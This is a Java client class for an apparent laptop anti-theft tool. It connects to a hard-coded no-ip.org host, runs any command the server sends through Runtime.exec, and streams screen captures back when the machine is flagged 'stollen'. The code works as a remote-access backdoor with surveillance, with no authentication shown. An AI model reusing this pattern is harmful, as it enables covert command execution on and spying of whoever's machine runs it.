package com.ben.client;

import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.ServerSocket;
import java.net.Socket;


import javax.imageio.ImageIO;

public class WorkerClass {
	
	private ObjectInputStream sInput;		// to read from the socket
	private ObjectOutputStream sOutput;		// to write on the socket
	public Socket socket;
public void Start() throws IOException, AWTException
{
	
		
	socket = new Socket("ben512.no-ip.org", 5124);
	//	socket = new Socket("ben512.no-ip.org", 5124);
		sInput  = new ObjectInputStream(socket.getInputStream());
		sOutput = new ObjectOutputStream(socket.getOutputStream());
		
		
		new ListenFromServer().start();
		System.out.println("Connected to Server");
		sOutput.writeObject(new Message(Message.LOGIN,"Login"));
	//	sOutput.writeObject("Hello");
		// infinite loop to wait for connections
		

		
		
	     
		
		
		
	}
	
	
	
	

class ListenFromServer  extends Thread {

	public void run(){
		try {
			Message input;
			Runtime rt = Runtime.getRuntime();
		ScreenCapture s = new ScreenCapture(sOutput);
		while(true)
		{
			
				input =  (Message) sInput.readObject();
				System.out.println("Received Message");
				if (input.getType() ==Message.ACK)
				{
					//no problem. End program.
					sOutput.writeObject(new Message(Message.ACK,"Received Ack, Shutting down - not stollen"));
				System.exit(0);
				
				}
				if (input.getType() ==Message.COMMAND)
				{
					
					Process pr = rt.exec(input.getMessage());
					//no problem. End program.
				System.out.println("Running command :" + input.getMessage());
				}
				
				if (input.getType() ==Message.STOLLEN)
				{
					sOutput.writeObject(new Message(Message.ACK,"Received Ack, computer stollen. Sending screencaptures...."));
					//Stollen, start taking photos.
					if (!s.isAlive())
					{
					s.start();
					}
				}
			
		}
	
			
			
		
		}
		catch(Exception e)
		{
			System.out.println(e.toString());
		}
		
	}
}
}
